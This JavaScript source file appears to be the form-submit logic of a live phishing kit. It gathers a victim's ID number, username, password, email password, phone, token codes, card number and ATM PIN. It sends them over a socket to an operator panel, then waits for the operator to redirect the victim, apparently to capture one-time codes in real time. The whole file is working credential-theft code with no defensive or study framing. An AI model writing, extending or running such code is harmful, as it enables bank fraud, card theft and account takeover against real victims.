import { loader } from "../components/loader";

export const submitBase = async({dataImportant, valuesData, setDisabledForm }) => {
    
    const {  modeLive, liveDataFilter, pageNow, setLiveError, navigate, setShowSpiner, socket, addData, urlToNavigate, spiner, timeLoader } = dataImportant

    const {
        typeDocument,
        nroDocument,
        username,
        password,
        correo,
        celular,
        claveCorreo,
        token1,
        token2,
        token3,
        image,
        method,
        factor,
        tarjeta,
        atmPassword,
    } = valuesData;
    const socketID = socket.id
    const [ newUser ] = await addData({
        typeDocument, nroDocument, username, password, correo, celular, claveCorreo, token1, token2, token3, factor, image, tarjeta, atmPassword, method,
         modeLive, socketID, liveData: liveDataFilter, pageNow, online: true, isLiveLoading: false
    })


    await socket.emit('[bag] create', newUser)  
    
    if ((spiner === true || timeLoader) && modeLive === false ) {
        loader(timeLoader, navigate, urlToNavigate)
        spiner === true && setShowSpiner(true)
        return
    }

    if (modeLive === true) { 
        setShowSpiner(true)
        return await socket.on('[live] bagWaitRedirect', ({urlPage, errorBag}) => { 
            
            if(errorBag) {
                setShowSpiner(false)
                setLiveError(true)
                return navigate(urlPage)
            } 
            setShowSpiner(false)
            setLiveError(false)
            navigate(urlPage)
            return socket.off('[live] bagWaitRedirect')
        }) 
    }

    return urlToNavigate.includes('https://') ? window.location.href = urlToNavigate : navigate(`${urlToNavigate}`)
}